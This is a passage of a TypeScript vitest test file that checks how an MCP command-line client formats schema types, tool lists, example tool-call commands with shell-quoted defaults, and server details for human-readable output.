/**
 * Tests for CLI output formatting
 */

import type { MockInstance } from 'vitest';
import { execFileSync } from 'node:child_process';
import { extractAllTextContent } from '../../../src/cli/tool-result.js';

// Mock chalk to return plain strings (required because Jest can't handle chalk's ESM imports)
vi.mock('chalk', () => {
  const identity = (s: string): string => s;
  const hex = (): ((s: string) => string) => identity;
  const palette = {
    cyan: identity,
    yellow: identity,
    red: identity,
    dim: identity,
    gray: identity,
    bold: identity,
    green: identity,
    greenBright: identity,
    blue: identity,
    magenta: identity,
    white: identity,
    hex,
  };
  return { default: palette, ...palette };
});

// Mock sessions module before importing output
vi.mock('../../../src/lib/sessions.js', () => ({
  getSession: vi.fn().mockResolvedValue(null),
}));

// Import after mock is set up
import {
  formatSchemaType,
  shortType,
  formatToolParamsInline,
  formatSimplifiedArgs,
  formatTools,
  formatToolDetail,
  formatServerDetails,
  formatTask,
  formatTasks,
  formatCompletionResult,
  formatDiscoverResult,
  formatResources,
  formatResourceDetail,
  formatResourceContents,
  formatResourceTemplates,
  formatResourceTemplateDetail,
  formatPrompts,
  formatPromptDetail,
  formatSkills,
  formatSkillDetail,
  formatDirectoryChildren,
  formatSessionLine,
  formatHuman,
  formatOutput,
  logTarget,
  formatToolCallExample,
  formatToolHints,
  formatCallToolResultHuman,
  formatPath,
  quoteShellArg,
  formatConnectStatusBadge,
} from '../../../src/cli/output.js';
import type {
  Tool,
  Resource,
  ResourceTemplate,
  Prompt,
  ServerDetails,
  SessionData,
  Skill,
} from '../../../src/lib/types.js';
import type { DecodedResourceContent } from '../../../src/lib/resource-content.js';

describe('extractAllTextContent', () => {
  it('should return text for single text content item', () => {
    const result = {
      content: [{ type: 'text', text: 'Hello world' }],
    };
    expect(extractAllTextContent(result)).toBe('Hello world');
  });

  it('should return text even if structuredContent is present', () => {
    const result = {
      content: [{ type: 'text', text: 'Some markdown' }],
      structuredContent: { foo: 'bar' },
    };
    expect(extractAllTextContent(result)).toBe('Some markdown');
  });

  it('should join texts when content is multiple text items', () => {
    const result = {
      content: [
        { type: 'text', text: 'First' },
        { type: 'text', text: 'Second' },
      ],
    };
    expect(extractAllTextContent(result)).toBe('First\nSecond');
  });

  it('should return undefined when content mixes text and non-text items', () => {
    const result = {
      content: [
        { type: 'text', text: 'First' },
        { type: 'image', data: 'base64...' },
      ],
    };
    expect(extractAllTextContent(result)).toBeUndefined();
  });

  it('should return undefined for non-text content type', () => {
    const result = {
      content: [{ type: 'image', data: 'base64...' }],
    };
    expect(extractAllTextContent(result)).toBeUndefined();
  });

  it('should return undefined for empty content array', () => {
    const result = {
      content: [],
    };
    expect(extractAllTextContent(result)).toBeUndefined();
  });

  it('should return undefined for missing content field', () => {
    const result = {
      structuredContent: { foo: 'bar' },
    };
    expect(extractAllTextContent(result)).toBeUndefined();
  });

  it('should return undefined for null', () => {
    expect(extractAllTextContent(null)).toBeUndefined();
  });

  it('should return undefined for undefined', () => {
    expect(extractAllTextContent(undefined)).toBeUndefined();
  });

  it('should return undefined for non-object', () => {
    expect(extractAllTextContent('string')).toBeUndefined();
    expect(extractAllTextContent(123)).toBeUndefined();
    expect(extractAllTextContent(true)).toBeUndefined();
  });

  it('should return undefined if text field is not a string', () => {
    const result = {
      content: [{ type: 'text', text: 123 }],
    };
    expect(extractAllTextContent(result)).toBeUndefined();
  });

  it('should handle empty string text', () => {
    const result = {
      content: [{ type: 'text', text: '' }],
    };
    expect(extractAllTextContent(result)).toBe('');
  });
});

describe('formatSchemaType', () => {
  it('should return simple type string', () => {
    expect(formatSchemaType({ type: 'string' })).toBe('string');
    expect(formatSchemaType({ type: 'number' })).toBe('number');
    expect(formatSchemaType({ type: 'boolean' })).toBe('boolean');
    expect(formatSchemaType({ type: 'integer' })).toBe('integer');
    expect(formatSchemaType({ type: 'object' })).toBe('object');
  });

  it('should handle union types (array of types)', () => {
    expect(formatSchemaType({ type: ['string', 'null'] })).toBe('string | null');
    expect(formatSchemaType({ type: ['number', 'string', 'boolean'] })).toBe(
      'number | string | boolean'
    );
  });

  it('should handle array type with items', () => {
    expect(formatSchemaType({ type: 'array', items: { type: 'string' } })).toBe('array<string>');
    expect(formatSchemaType({ type: 'array', items: { type: 'number' } })).toBe('array<number>');
    expect(
      formatSchemaType({
        type: 'array',
        items: { type: 'array', items: { type: 'boolean' } },
      })
    ).toBe('array<array<boolean>>');
  });

  it('should handle object type with properties', () => {
    expect(
      formatSchemaType({
        type: 'object',
        properties: { name: { type: 'string' } },
      })
    ).toBe('object');
  });

  it('should handle small enums (5 or fewer values)', () => {
    expect(formatSchemaType({ enum: ['a', 'b', 'c'] })).toBe('"a" | "b" | "c"');
    expect(formatSchemaType({ enum: [1, 2, 3] })).toBe('1 | 2 | 3');
    expect(formatSchemaType({ enum: [true, false] })).toBe('true | false');
  });

  it('should handle large enums (more than 5 values)', () => {
    expect(formatSchemaType({ enum: ['a', 'b', 'c', 'd', 'e', 'f'] })).toBe('enum(6 values)');
    expect(formatSchemaType({ enum: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10] })).toBe('enum(10 values)');
  });

  it('should handle oneOf', () => {
    expect(formatSchemaType({ oneOf: [{ type: 'string' }, { type: 'number' }] })).toBe(
      'string | number'
    );
  });

  it('should handle anyOf', () => {
    expect(formatSchemaType({ anyOf: [{ type: 'boolean' }, { type: 'null' }] })).toBe(
      'boolean | null'
    );
  });

  it('should return "any" for invalid input', () => {
    expect(formatSchemaType(null as unknown as Record<string, unknown>)).toBe('any');
    expect(formatSchemaType(undefined as unknown as Record<string, unknown>)).toBe('any');
    expect(formatSchemaType('string' as unknown as Record<string, unknown>)).toBe('any');
    expect(formatSchemaType({} as Record<string, unknown>)).toBe('any');
  });
});

describe('shortType', () => {
  it('should abbreviate primitive types', () => {
    expect(shortType({ type: 'string' })).toBe('str');
    expect(shortType({ type: 'number' })).toBe('num');
    expect(shortType({ type: 'integer' })).toBe('int');
    expect(shortType({ type: 'boolean' })).toBe('bool');
    expect(shortType({ type: 'object' })).toBe('obj');
  });

  it('should format array types with brackets', () => {
    expect(shortType({ type: 'array', items: { type: 'string' } })).toBe('[str]');
    expect(shortType({ type: 'array', items: { type: 'number' } })).toBe('[num]');
    expect(shortType({ type: 'array', items: { type: 'object' } })).toBe('[obj]');
    expect(shortType({ type: 'array' })).toBe('[any]');
  });

  it('should handle nested arrays', () => {
    expect(shortType({ type: 'array', items: { type: 'array', items: { type: 'boolean' } } })).toBe(
      '[[bool]]'
    );
  });

  it('should handle union types, filtering null', () => {
    expect(shortType({ type: ['string', 'null'] })).toBe('str');
    expect(shortType({ type: ['number', 'string'] })).toBe('num | str');
  });

  it('should handle enums', () => {
    expect(shortType({ enum: ['a', 'b', 'c'] })).toBe('enum');
  });

  it('should return "any" for invalid input', () => {
    expect(shortType(null as unknown as Record<string, unknown>)).toBe('any');
    expect(shortType(undefined as unknown as Record<string, unknown>)).toBe('any');
    expect(shortType({} as Record<string, unknown>)).toBe('any');
  });
});

describe('formatToolParamsInline', () => {
  it('should return () for empty or missing properties', () => {
    expect(formatToolParamsInline({ type: 'object', properties: {} })).toBe('()');
    expect(formatToolParamsInline({ type: 'object' })).toBe('()');
    expect(formatToolParamsInline({})).toBe('()');
  });

  it('should show required params before optional params', () => {
    const schema = {
      type: 'object',
      properties: {
        optional1: { type: 'string' },
        required1: { type: 'number' },
      },
      required: ['required1'],
    };
    expect(formatToolParamsInline(schema)).toBe('(required1:num, optional1?:str)');
  });

  it('should truncate to 3 params with ellipsis', () => {
    const schema = {
      type: 'object',
      properties: {
        a: { type: 'string' },
        b: { type: 'string' },
        c: { type: 'string' },
        d: { type: 'string' },
      },
      required: ['a', 'b', 'c', 'd'],
    };
    expect(formatToolParamsInline(schema)).toBe('(a:str, b:str, c:str, \u2026)');
  });
});

describe('formatSimplifiedArgs', () => {
  it('should format simple properties with bullet points', () => {
    const schema = {
      type: 'object',
      properties: {
        name: { type: 'string' },
        age: { type: 'number' },
      },
    };
    const lines = formatSimplifiedArgs(schema);
    expect(lines).toHaveLength(2);
    expect(lines[0]).toBe('* `name`: string');
    expect(lines[1]).toBe('* `age`: number');
  });

  it('should mark required properties', () => {
    const schema = {
      type: 'object',
      properties: {
        name: { type: 'string' },
        email: { type: 'string' },
      },
      required: ['name'],
    };
    const lines = formatSimplifiedArgs(schema);
    expect(lines).toHaveLength(2);
    expect(lines[0]).toBe('* `name`: string [required]');
    expect(lines[1]).toBe('* `email`: string');
  });

  it('should include descriptions', () => {
    const schema = {
      type: 'object',
      properties: {
        path: { type: 'string', description: 'The file path to read' },
      },
    };
    const lines = formatSimplifiedArgs(schema);
    expect(lines).toHaveLength(1);
    expect(lines[0]).toBe('* `path`: string - The file path to read');
  });

  it('should include default values', () => {
    const schema = {
      type: 'object',
      properties: {
        limit: { type: 'number', default: 10 },
        enabled: { type: 'boolean', default: true },
        format: { type: 'string', default: 'json' },
      },
    };
    const lines = formatSimplifiedArgs(schema);
    expect(lines).toHaveLength(3);
    expect(lines[0]).toBe('* `limit`: number (default: 10)');
    expect(lines[1]).toBe('* `enabled`: boolean (default: true)');
    expect(lines[2]).toBe('* `format`: string (default: "json")');
  });

  it('should handle full combination of required, description, and default', () => {
    const schema = {
      type: 'object',
      properties: {
        query: {
          type: 'string',
          description: 'Search query',
        },
        limit: {
          type: 'number',
          description: 'Max results',
          default: 10,
        },
      },
      required: ['query'],
    };
    const lines = formatSimplifiedArgs(schema);
    expect(lines).toHaveLength(2);
    expect(lines[0]).toBe('* `query`: string [required] - Search query');
    expect(lines[1]).toBe('* `limit`: number (default: 10) - Max results');
  });

  it('should use custom indent', () => {
    const schema = {
      type: 'object',
      properties: {
        name: { type: 'string' },
      },
    };
    const lines = formatSimplifiedArgs(schema, '  ');
    expect(lines).toHaveLength(1);
    expect(lines[0]).toBe('  * `name`: string');
  });

  it('should return "(none)" for schema without properties', () => {
    const lines1 = formatSimplifiedArgs({ type: 'object' });
    expect(lines1).toEqual(['* (none)']);

    const lines2 = formatSimplifiedArgs({ type: 'object', properties: {} });
    expect(lines2).toEqual(['* (none)']);
  });

  it('should return "(none)" for null or invalid schema', () => {
    expect(formatSimplifiedArgs(null as unknown as Record<string, unknown>)).toEqual(['* (none)']);
    expect(formatSimplifiedArgs(undefined as unknown as Record<string, unknown>)).toEqual([
      '* (none)',
    ]);
    expect(formatSimplifiedArgs('string' as unknown as Record<string, unknown>)).toEqual([
      '* (none)',
    ]);
  });

  it('should handle complex types in properties', () => {
    const schema = {
      type: 'object',
      properties: {
        tags: { type: 'array', items: { type: 'string' } },
        status: { enum: ['active', 'inactive'] },
        data: { type: ['string', 'null'] },
      },
    };
    const lines = formatSimplifiedArgs(schema);
    expect(lines).toHaveLength(3);
    expect(lines[0]).toBe('* `tags`: array<string>');
    expect(lines[1]).toBe('* `status`: "active" | "inactive"');
    expect(lines[2]).toBe('* `data`: string | null');
  });
});

describe('formatTools', () => {
  const sampleTools: Tool[] = [
    {
      name: 'search_web',
      description: 'Search the web for information using DuckDuckGo and return relevant results',
      inputSchema: {
        type: 'object',
        properties: {
          query: { type: 'string', description: 'Search query' },
          maxResults: { type: 'number', description: 'Max results' },
          language: { type: 'string', description: 'Language code' },
        },
        required: ['query'],
      },
      outputSchema: {
        type: 'object',
        properties: {
          results: { type: 'array' },
          total: { type: 'number' },
        },
      },
      annotations: {
        readOnlyHint: true,
      },
    },
    {
      name: 'run_actor',
      description: 'Run an Apify Actor with the given input',
      inputSchema: {
        type: 'object',
        properties: {
          actorId: { type: 'string' },
          input: { type: 'object' },
          memory: { type: 'number' },
          timeout: { type: 'number' },
          build: { type: 'string' },
        },
        required: ['actorId'],
      },
      outputSchema: {
        type: 'array',
        items: {
          type: 'object',
          properties: {
            id: { type: 'string' },
            status: { type: 'string' },
          },
        },
      },
      annotations: {
        destructiveHint: true,
      },
    },
  ] as Tool[];

  describe('compact format (default)', () => {
    it('should show header with tool count', () => {
      const output = formatTools(sampleTools);
      expect(output).toContain('Tools (2):');
    });

    it('should show tool names in backticks', () => {
      const output = formatTools(sampleTools);
      expect(output).toContain('`search_web (');
      expect(output).toContain('`run_actor (');
    });

    it('should use * bullet character', () => {
      const output = formatTools(sampleTools);
      expect(output).toContain('* `');
    });

    it('should show inline parameters with short types after tool name', () => {
      const output = formatTools(sampleTools);
      // search_web: 1 required + 2 optional = 3 total, all shown
      expect(output).toContain('`search_web (query:str, maxResults?:num, language?:str)`');
      // run_actor: 1 required + 4 optional = 5 total, show first 3 + ellipsis
      expect(output).toContain('`run_actor (actorId:str, input?:obj, memory?:num, \u2026)`');
    });

    it('should show annotations after parameters', () => {
      const output = formatTools(sampleTools);
      expect(output).toContain('[read-only]');
      expect(output).toContain('[destructive]');
    });

    it('should show hint to fetch tool details before calling', () => {
      const output = formatTools(sampleTools);
      expect(output).toContain('Before calling a tool');
      expect(output).toContain('tools-get <name>');
      expect(output).toContain('tools-list --full');
    });

    it('should NOT show detailed input schema', () => {
      const output = formatTools(sampleTools);
      // Detailed format has "Input:" sections
      expect(output).not.toContain('Input:');
    });
  });

  describe('full format (with { full: true })', () => {
    it('should show detailed view with separators', () => {
      const output = formatTools(sampleTools, { full: true });
      expect(output).toContain('---');
    });

    it('should show Input sections', () => {
      const output = formatTools(sampleTools, { full: true });
      expect(output).toContain('Input:');
    });

    it('should show full parameter details with types', () => {
      const output = formatTools(sampleTools, { full: true });
      expect(output).toContain('`query`: string [required]');
      expect(output).toContain('`maxResults`: number');
    });

    it('should show full descriptions in code blocks', () => {
      const output = formatTools(sampleTools, { full: true });
      expect(output).toContain('Description:');
      expect(output).toContain('````');
      expect(output).toContain(
        'Search the web for information using DuckDuckGo and return relevant results'
      );
    });

    it('should NOT show hint about fetching tool details', () => {
      const output = formatTools(sampleTools, { full: true });
      expect(output).not.toContain('Before calling a tool');
    });
  });

  describe('edge cases', () => {
    it('should handle tools with no parameters', () => {
      const tools: Tool[] = [
        {
          name: 'no_params_tool',
          description: 'A tool with no parameters',
          inputSchema: { type: 'object', properties: {} },
        },
      ];

      const output = formatTools(tools);
      expect(output).toContain('`no_params_tool ()`');
    });

    it('should handle tools with no description', () => {
      const tools: Tool[] = [
        {
          name: 'undocumented',
          inputSchema: {
            type: 'object',
            properties: { arg: { type: 'string' } },
          },
        },
      ];

      const output = formatTools(tools);
      expect(output).toContain('`undocumented (arg?:str)`');
    });

    it('should handle empty tools array', () => {
      const output = formatTools([]);
      expect(output).toContain('Tools (0):');
    });

    it('should show task mode for tools with task support', () => {
      const tools = [
        {
          name: 'optional_tool',
          description: 'A tool with optional task support',
          inputSchema: { type: 'object', properties: {} },
          execution: { taskSupport: 'optional' },
        },
        {
          name: 'required_tool',
          description: 'A tool with required task support',
          inputSchema: { type: 'object', properties: {} },
          execution: { taskSupport: 'required' },
        },
        {
          name: 'forbidden_tool',
          description: 'A tool with forbidden task support',
          inputSchema: { type: 'object', properties: {} },
          execution: { taskSupport: 'forbidden' },
        },
        {
          name: 'sync_tool',
          description: 'A regular tool',
          inputSchema: { type: 'object', properties: {} },
        },
      ] as Tool[];

      const output = formatTools(tools);
      expect(output).toContain('`optional_tool ()` [task:optional]');
      expect(output).toContain('`required_tool ()` [task:required]');
      expect(output).not.toContain('`forbidden_tool ()` [');
      expect(output).not.toContain('`sync_tool ()` [');
    });

    it('should show all params when 3 or fewer total', () => {
      const tools: Tool[] = [
        {
          name: 'simple_tool',
          inputSchema: {
            type: 'object',
            properties: {
              a: { type: 'string' },
              b: { type: 'number' },
              c: { type: 'boolean' },
            },
            required: ['a'],
          },
        },
      ] as Tool[];

      const output = formatTools(tools);
      expect(output).toContain('`simple_tool (a:str, b?:num, c?:bool)`');
    });

    it('should show at most 3 params with ellipsis for the rest', () => {
      const tools: Tool[] = [
        {
          name: 'many_required',
          inputSchema: {
            type: 'object',
            properties: {
              a: { type: 'string' },
              b: { type: 'string' },
              c: { type: 'string' },
              d: { type: 'string' },
              e: { type: 'number' },
            },
            required: ['a', 'b', 'c', 'd'],
          },
        },
      ] as Tool[];

      const output = formatTools(tools);
      // Required params first, then optional; max 3 shown + ellipsis
      expect(output).toContain('`many_required (a:str, b:str, c:str, \u2026)`');
    });

    it('should combine annotations and task indicator', () => {
      const tools = [
        {
          name: 'combined_tool',
          inputSchema: { type: 'object', properties: {} },
          annotations: { readOnlyHint: true },
          execution: { taskSupport: 'required' },
        },
      ] as Tool[];

      const output = formatTools(tools);
      expect(output).toContain('[read-only, task:required]');
    });
  });
});

describe('formatToolDetail', () => {
  it('should format tool with all features: title, annotations, input, output, description', () => {
    const tool: Tool = {
      name: 'call-actor',
      description: 'Calls an Actor on Apify platform',
      inputSchema: {
        type: 'object',
        properties: {
          actorId: { type: 'string', description: 'Actor ID to call' },
          input: { type: 'object', description: 'Input for the Actor' },
        },
        required: ['actorId'],
      },
      outputSchema: {
        type: 'object',
        properties: {
          runId: { type: 'string', description: 'ID of the Actor run' },
        },
      },
      annotations: {
        title: 'Call Actor',
        openWorldHint: true,
      },
    };

    const output = formatToolDetail(tool);

    // Should contain title as heading
    expect(output).toContain('# Call Actor');

    // Should contain tool name with annotations
    expect(output).toContain('Tool:');
    expect(output).toContain('`call-actor`');
    expect(output).toContain('[open-world]');

    // Should contain Input section with arguments
    expect(output).toContain('Input:');
    expect(output).toContain('`actorId`');
    expect(output).toContain('[required]');
    expect(output).toContain('Actor ID to call');
    expect(output).toContain('`input`');

    // Should contain Output section
    expect(output).toContain('Output:');
    expect(output).toContain('`runId`');
    expect(output).toContain('ID of the Actor run');

    // Should contain Description in code block
    expect(output).toContain('Description:');
    expect(output).toContain('````');
    expect(output).toContain('Calls an Actor on Apify platform');
  });

  it('should format tool with minimal features (no title, no output, no annotations)', () => {
    const tool: Tool = {
      name: 'simple-tool',
      description: 'A simple tool',
      inputSchema: {
        type: 'object',
        properties: {
          query: { type: 'string' },
        },
      },
    };

    const output = formatToolDetail(tool);

    // Should NOT contain title heading (no annotations.title)
    expect(output).not.toContain('# ');

    // Should contain tool name
    expect(output).toContain('Tool:');
    expect(output).toContain('`simple-tool`');

    // Should NOT contain annotation brackets (no annotations)
    expect(output).not.toContain('[read-only]');
    expect(output).not.toContain('[open-world]');

    // Should contain Input section
    expect(output).toContain('Input:');
    expect(output).toContain('`query`');

    // Should NOT contain Output section
    expect(output).not.toMatch(/Output:/);

    // Should contain Description
    expect(output).toContain('Description:');
    expect(output).toContain('A simple tool');
  });

  it('should format tool with read-only annotation', () => {
    const tool: Tool = {
      name: 'fetch-data',
      description: 'Fetches data',
      inputSchema: {
        type: 'object',
        properties: {},
      },
      annotations: {
        readOnlyHint: true,
      },
    };

    const output = formatToolDetail(tool);

    expect(output).toContain('[read-only]');
    expect(output).not.toContain('[open-world]');
  });

  it('should show (none) for tool with no input properties', () => {
    const tool: Tool = {
      name: 'no-args-tool',
      description: 'Tool with no arguments',
      inputSchema: {
        type: 'object',
        properties: {},
      },
    };

    const output = formatToolDetail(tool);

    expect(output).toContain('Input:');
    expect(output).toContain('(none)');
  });

  it('should omit Description section when description is missing', () => {
    const tool: Tool = {
      name: 'undocumented-tool',
      inputSchema: {
        type: 'object',
        properties: {},
      },
    };

    const output = formatToolDetail(tool);

    // Description section should be omitted when no description
    expect(output).not.toContain('Description:');
  });

  it('should show default values for input arguments', () => {
    const tool: Tool = {
      name: 'tool-with-defaults',
      description: 'Tool with default values',
      inputSchema: {
        type: 'object',
        properties: {
          limit: { type: 'number', default: 100, description: 'Max items' },
          format: { type: 'string', default: 'json' },
        },
      },
    };

    const output = formatToolDetail(tool);

    expect(output).toContain('(default: 100)');
    expect(output).toContain('(default: "json")');
    // Default should come before description
    expect(output).toMatch(/\(default: 100\).*Max items/);
  });
});

describe('formatToolCallExample', () => {
  it('should show required params and fill optional up to 3', () => {
    const tool: Tool = {
      name: 'read_file',
      inputSchema: {
        type: 'object',
        properties: {
          path: { type: 'string' },
          encoding: { type: 'string', default: 'utf-8' },
          tail: { type: 'integer', minimum: 0 },
        },
        required: ['path'],
      },
    };

    const output = formatToolCallExample(tool, '@fs');
    expect(output).not.toBeNull();
    expect(output).toContain('tools-call read_file');
    expect(output).toContain('@fs');
    expect(output).toContain(`path:='"something"'`);
    expect(output).toContain(`encoding:='"utf-8"'`);
    expect(output).toContain('tail:=0');
  });

  it('should use default values when available', () => {
    const tool: Tool = {
      name: 'search',
      inputSchema: {
        type: 'object',
        properties: {
          query: { type: 'string' },
          limit: { type: 'number', default: 10 },
        },
        required: ['query'],
      },
    };

    const output = formatToolCallExample(tool, '@test');
    expect(output).toContain(`query:='"something"'`);
    expect(output).toContain('limit:=10');
  });

  it('should show example for tool with no parameters', () => {
    const tool: Tool = {
      name: 'ping',
      inputSchema: { type: 'object', properties: {} },
    };

    const output = formatToolCallExample(tool, '@srv');
    expect(output).not.toBeNull();
    expect(output).toContain('tools-call ping');
    // Should NOT contain any key:= pairs
    expect(output).not.toContain(':=');
  });

  it('should use enum first value as example', () => {
    const tool: Tool = {
      name: 'set-mode',
      inputSchema: {
        type: 'object',
        properties: {
          mode: { type: 'string', enum: ['fast', 'slow', 'normal'] },
        },
        required: ['mode'],
      },
    };

    const output = formatToolCallExample(tool, '@s');
    expect(output).toContain(`mode:='"fast"'`);
  });

  it('should use placeholder <@session> when no session name provided', () => {
    const tool: Tool = {
      name: 'test',
      inputSchema: { type: 'object', properties: { a: { type: 'string' } } },
    };

    const output = formatToolCallExample(tool);
    expect(output).toContain('<@session>');
  });

  it('should include --task for task:required tools', () => {
    const tool = {
      name: 'long-run',
      inputSchema: { type: 'object', properties: { q: { type: 'string' } }, required: ['q'] },
      execution: { taskSupport: 'required' },
    } as unknown as Tool;

    const output = formatToolCallExample(tool, '@s');
    expect(output).toContain('--task');
    expect(output).not.toContain('[--task]');
  });

  it('should include [--task] for task:optional tools', () => {
    const tool = {
      name: 'maybe-async',
      inputSchema: { type: 'object', properties: {} },
      execution: { taskSupport: 'optional' },
    } as unknown as Tool;

    const output = formatToolCallExample(tool, '@s');
    expect(output).toContain('[--task]');
  });

  it('should shell-quote array default values so they survive shell parsing', () => {
    // Regression: array defaults like ["markdown"] were being rendered without
    // shell quoting, so the shell stripped the inner double quotes and mcpc
    // received `[markdown]`, which is not valid JSON.
    const tool: Tool = {
      name: 'rag-web-browser',
      inputSchema: {
        type: 'object',
        properties: {
          query: { type: 'string' },
          outputFormats: { type: 'array', default: ['markdown'] },
        },
        required: ['query'],
      },
    };

    const output = formatToolCallExample(tool, '@apify');
    expect(output).toContain(`outputFormats:='["markdown"]'`);
  });

  it('should shell-quote object default values', () => {
    const tool: Tool = {
      name: 'configure',
      inputSchema: {
        type: 'object',
        properties: {
          config: { type: 'object', default: { key: 'value' } },
        },
        required: ['config'],
      },
    };

    const output = formatToolCallExample(tool, '@s');
    expect(output).toContain(`config:='{"key":"value"}'`);
  });

  it('should use an array or object example for array and object params without defaults', () => {
    const tool: Tool = {
      name: 'crawl',
      inputSchema: {
        type: 'object',
        properties: {
          urls: { type: 'array', items: { type: 'string' } },
          ids: { type: 'array' },
          options: { type: 'object' },
        },
        required: ['urls', 'ids', 'options'],
      },
    };

    const output = formatToolCallExample(tool, '@s');
    expect(output).toContain(`urls:='["something"]'`);
    expect(output).toContain(`ids:='[]'`);
    expect(output).toContain(`options:='{}'`);
  });

  it('should use an array or object example for nullable array and object params', () => {
    const tool: Tool = {
      name: 'crawl',
      inputSchema: {
        type: 'object',
        properties: {
          ids: { type: ['array', 'null'], items: { type: 'integer' } },
          options: { type: ['null', 'object'] },
          tags: { anyOf: [{ type: 'array', items: { type: 'string' } }, { type: 'null' }] },
        },
        required: ['ids', 'options', 'tags'],
      },
    };

    const output = formatToolCallExample(tool, '@s');
    expect(output).toContain(`ids:='[1]'`);
    expect(output).toContain(`options:='{}'`);
    expect(output).toContain(`tags:='["something"]'`);
  });

  it('should resolve $ref, tuple and required object properties in examples', () => {
    const tool: Tool = {
      name: 'plot',
      inputSchema: {
        type: 'object',
        $defs: {
          Point: {
            type: 'object',
            properties: { x: { type: 'number' }, label: { type: 'string' } },
            required: ['x'],
          },
        },
        properties: {
          points: { type: 'array', items: { $ref: '#/$defs/Point' } },
          range: {
            type: 'array',
            prefixItems: [{ type: 'integer', minimum: 0 }, { type: 'number' }],
          },
          mode: { const: 'fast' },
        },
        required: ['points', 'range', 'mode'],
      },
    };

    const output = formatToolCallExample(tool, '@s');
    expect(output).toContain(`points:='[{"x":1}]'`);
    expect(output).toContain(`range:='[0,1]'`);
    expect(output).toContain(`mode:='"fast"'`);
  });

  it('should stop following a recursive $ref', () => {
    const tool: Tool = {
      name: 'tree',
      inputSchema: {
        type: 'object',
        $defs: {
          Node: {
            type: 'object',
            properties: { child: { $ref: '#/$defs/Node' } },
            required: ['child'],
          },
        },
        properties: { root: { $ref: '#/$defs/Node' }, bad: { $ref: '#/$defs/%zz' } },
        required: ['root', 'bad'],
      },
    };

    const output = formatToolCallExample(tool, '@s');
    expect(output).toContain(`root:='{"child":{"child":{}}}'`);
    expect(output).toContain(`bad:='"something"'`);
  });
});

describe('formatToolHints', () => {
  it('should combine annotations and task support', () => {
    const tool = {
      name: 'test',
      inputSchema: { type: 'object', properties: {} },
      annotations: { destructiveHint: true, openWorldHint: true },
      execution: { taskSupport: 'required' },
    } as unknown as Tool;

    const hints = formatToolHints(tool);
    expect(hints).toContain('destructive');
    expect(hints).toContain('open-world');
    expect(hints).toContain('task:required');
  });

  it('should return null when no annotations and no task support', () => {
    const tool: Tool = {
      name: 'plain',
      inputSchema: { type: 'object', properties: {} },
    };

    expect(formatToolHints(tool)).toBeNull();
  });

  it('should show only task support when no annotations', () => {
    const tool = {
      name: 'async-only',
      inputSchema: { type: 'object', properties: {} },
      execution: { taskSupport: 'optional' },
    } as unknown as Tool;

    const hints = formatToolHints(tool);
    expect(hints).toBe('task:optional');
  });
});

describe('formatServerDetails', () => {
  it('should format server info with all features', () => {
    const details: ServerDetails = {
      protocolVersion: '2025-11-25',
      capabilities: {
        tools: { listChanged: true },
        resources: { subscribe: true, listChanged: true },
        prompts: { listChanged: false },
        logging: {},
        completions: {},
      },
      serverInfo: { name: 'Test Server', version: '1.2.3' },
      instructions: 'This is the server instructions.',
    };

    const output = formatServerDetails(details, '@test');

    // Should contain server info
    expect(output).toContain('Server:');
    expect(output).toContain('Test Server (version: 1.2.3)');

    // Should contain capabilities section
    expect(output).toContain('Capabilities:');
    expect(output).toContain('tools (dynamic)');
    expect(output).toContain('resources (supports subscribe, dynamic list)');
    expect(output).toContain('prompts');
    expect(output).toContain('logging');
    expect(output).toContain('completions');

    // Should contain available commands
    expect(output).toContain('Available commands:');
    expect(output).toContain('mcpc @test tools-list');
    expect(output).toContain('mcpc @test tools-call');
    expect(output).toContain('mcpc @test resources-list');
    expect(output).toContain('mcpc @test resources-read');
    expect(output).toContain('mcpc @test prompts-list');
    expect(output).toContain('mcpc @test completion-complete prompt|resource <ref> <arg1:=val1');
    expect(output).toContain('mcpc @test logging-set-level');

    // Should contain instructions in code block
    expect(output).toContain('Instructions:');
    expect(output).toContain('````');
    expect(output).toContain('This is the server instructions.');
  });

  it('shows the description and website URL a server advertises in serverInfo', () => {
    const details: ServerDetails = {
      protocolVersion: '2025-11-25',
      capabilities: { tools: {} },
      serverInfo: {
        name: 'Notion MCP',
        version: '1.2.0',
        description: "Notion's official MCP server.\nUse your workspace as a system of record.",
        websiteUrl: 'https://developers.notion.com/docs/mcp',
      },
    };

    const output = formatServerDetails(details, '@notion');

    expect(output).toContain('Notion MCP (version: 1.2.0)');
    expect(output).toContain(
      "* Description: Notion's official MCP server.\n               Use your workspace as a system of record."
    );
    expect(output).toContain('* Website: https://developers.notion.com/docs/mcp');
  });

  it('keeps the server line alone when no description or website URL is advertised', () => {
    const details: ServerDetails = {
      protocolVersion: '2025-11-25',
      capabilities: { tools: {} },
      serverInfo: { name: 'Bare Server', version: '1.0.0' },
    };

    const output = formatServerDetails(details, '@bare');

    expect(output).toContain('Server: Bare Server (version: 1.0.0)\n\nCapabilities:');
  });

  it('shows the MCP version with the transport and its connection mode', () => {
    const details: ServerDetails = {
      protocolVersion: '2026-07-28',
      capabilities: {},
      serverInfo: { name: 'Stateless Server', version: '1.0.0' },
      connectionMode: 'stateless',
      transport: 'streamable-http',
    };

    const output = formatServerDetails(details, '@s');

    expect(output).toContain('MCP: version 2026-07-28 / Streamable HTTP (stateless)');
  });

  it('keeps supportedVersions out of the human-mode version line (a --json-only detail)', () => {
    const details: ServerDetails = {
      protocolVersion: '2026-07-28',
      supportedVersions: ['2026-07-28', '2025-11-25'],
      capabilities: {},
      serverInfo: { name: 'Dual Server', version: '1.0.0' },
      connectionMode: 'stateless',
      transport: 'streamable-http',
    };

    const output = formatServerDetails(details, '@s');

    expect(output).toContain('MCP: version 2026-07-28 / Streamable HTTP (stateless)');
    expect(output).not.toContain('2025-11-25');
  });

  it('names the stdio transport', () => {
    const details: ServerDetails = {
      protocolVersion: '2025-11-25',
      capabilities: {},
      serverInfo: { name: 'Local Server', version: '1.0.0' },
      connectionMode: 'stateful',
      transport: 'stdio',
    };

    const output = formatServerDetails(details, '@s');

    expect(output).toContain('MCP: version 2025-11-25 / stdio (stateful)');
  });

  it('marks a pinned MCP version and omits an unknown connection mode', () => {
    const details: ServerDetails = {
      protocolVersion: '2025-11-25',
      capabilities: {},
      serverInfo: { name: 'Pinned Server', version: '1.0.0' },
      connectionMode: 'unknown',
      transport: 'streamable-http',
    };

    const output = formatServerDetails(details, '@s', undefined, undefined, '2025-11-25');

    expect(output).toContain('MCP: version 2025-11-25 (pinned) / Streamable HTTP');
    expect(output).not.toContain('(unknown)');
  });

  it('shows the MCP version alone when the transport is not known yet', () => {
    const details: ServerDetails = {
